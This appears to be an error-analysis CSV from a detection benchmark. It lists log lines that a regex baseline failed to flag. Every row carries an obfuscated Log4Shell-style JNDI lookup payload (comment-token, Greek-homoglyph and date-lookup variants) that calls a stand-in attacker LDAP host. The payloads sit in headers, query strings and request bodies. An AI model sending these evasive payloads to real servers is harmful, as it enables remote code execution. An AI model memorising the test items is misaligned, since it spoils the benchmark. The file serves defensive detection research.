model,test_set,id,source,raw_log,normalized_log,true_label,pred_label,score,threshold,error_type,obfuscation_type,explanation
Regex Baseline,adversarial_evasion_test.csv,LS-001379,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://evil.example/date-jn},request from user-agent: ${${date:'jn'}di:ldap://evil.example/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001380,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${date:'jn'}di:ldap://evil.example/date-jn},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${${date:'jn'}di:ldap://evil.example/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001417,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://evil.example/comment-token} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001418,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://evil.example/comment-token} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001419,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://evil.example/comment-token} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${j${/**/}ndi:ldap://evil.example/comment-token} | method: get | host: app.local | path: /api/products?id=123,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001420,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://evil.example/comment-token},request from user-agent: ${j${/**/}ndi:ldap://evil.example/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001421,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${j${/**/}ndi:ldap://evil.example/comment-token},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${j${/**/}ndi:ldap://evil.example/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001422,adversarial_evasion,GET /search?q=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${j${/**/}ndi:ldap://evil.example/comment-token} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001423,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j${/**/}ndi:ldap://evil.example/comment-token},post /search http/1.1 host: app.local body: query=${j${/**/}ndi:ldap://evil.example/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001424,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://evil.example/comment-token} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001425,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://evil.example/comment-token} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001426,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://evil.example/comment-token} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${j${/**/}ndi:ldap://evil.example/comment-token} | method: get | host: app.local | path: /api/products?id=123,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001427,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://evil.example/comment-token},request from user-agent: ${j${/**/}ndi:ldap://evil.example/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001428,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${j${/**/}ndi:ldap://evil.example/comment-token},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /metrics | x-api-version: ${j${/**/}ndi:ldap://evil.example/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001561,adversarial_evasion,GET /?q=${ϳndi:ldap://attacker.evil.com/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://attacker.evil.com/greek-j} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001562,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://attacker.evil.com/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://attacker.evil.com/greek-j} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001563,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://attacker.evil.com/greek-j} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${ϳndi:ldap://attacker.evil.com/greek-j} | method: get | host: app.local | path: /metrics,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001564,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://attacker.evil.com/greek-j},request from user-agent: ${ϳndi:ldap://attacker.evil.com/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001565,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${ϳndi:ldap://attacker.evil.com/greek-j},request from user-agent: java/11.0.13 | method: get | host: app.local | path: / | x-api-version: ${ϳndi:ldap://attacker.evil.com/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001566,adversarial_evasion,GET /search?q=${ϳndi:ldap://attacker.evil.com/greek-j} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${ϳndi:ldap://attacker.evil.com/greek-j} http/1.1 host: app.local user-agent: java/11.0.13,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001567,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ϳndi:ldap://attacker.evil.com/greek-j},post /search http/1.1 host: app.local body: query=${ϳndi:ldap://attacker.evil.com/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001568,adversarial_evasion,GET /?q=${ϳndi:ldap://attacker.evil.com/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://attacker.evil.com/greek-j} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001569,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://attacker.evil.com/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://attacker.evil.com/greek-j} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001570,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://attacker.evil.com/greek-j} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${ϳndi:ldap://attacker.evil.com/greek-j} | method: get | host: app.local | path: /login,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001571,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://attacker.evil.com/greek-j},request from user-agent: ${ϳndi:ldap://attacker.evil.com/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001572,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${ϳndi:ldap://attacker.evil.com/greek-j},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${ϳndi:ldap://attacker.evil.com/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001597,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001598,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001599,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn} | method: get | host: app.local | path: /login,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001600,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},request from user-agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001601,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /login | x-api-version: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001602,adversarial_evasion,GET /search?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001603,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'jn'}di:ldap://attacker.evil.com/date-jn},post /search http/1.1 host: app.local body: query=${${date:'jn'}di:ldap://attacker.evil.com/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001604,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001605,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://attacker.evil.com/date-jn} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001606,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn} | Method: GET | Host: app.local | Path: /,request from user-agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn} | method: get | host: app.local | path: /,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001607,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},request from user-agent: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001608,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /home | x-api-version: ${${date:'jn'}di:ldap://attacker.evil.com/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001645,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001646,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001647,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token} | method: get | host: app.local | path: /home,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001648,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},request from user-agent: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001649,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${j${/**/}ndi:ldap://attacker.evil.com/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001650,adversarial_evasion,GET /search?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} http/1.1 host: app.local user-agent: java/11.0.13,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001651,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j${/**/}ndi:ldap://attacker.evil.com/comment-token},post /search http/1.1 host: app.local body: query=${j${/**/}ndi:ldap://attacker.evil.com/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001652,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-001653,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://attacker.evil.com/comment-token} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
